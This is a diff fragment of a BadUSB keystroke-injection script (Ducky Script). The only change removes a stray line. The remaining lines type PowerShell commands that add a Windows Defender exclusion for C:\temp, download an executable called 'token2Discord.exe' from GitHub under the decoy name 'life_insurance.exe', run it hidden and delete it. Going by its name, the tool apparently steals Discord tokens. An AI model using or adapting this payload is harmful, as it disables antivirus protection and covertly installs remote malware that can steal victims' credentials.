@@ -11,7 +11,6 @@ DELAY 500
 STRING cd C:\; mkdir temp; cd temp; Add-MpPreference -ExclusionPath "C:\temp"
 ENTER
 DELAY 500
-mkdir temp ; cd temp
 STRING $url = 'https://github.com/CharlesTheGreat77/token2Discord/raw/main/token2Discord.exe'; $file = 'C:\temp\life_insurance.exe'; Invoke-WebRequest -Uri $url -OutFile $file; Start-Process -FilePath $file -WindowStyle Hidden; Remove-Item -Path $file
 ENTER
 DELAY 6000
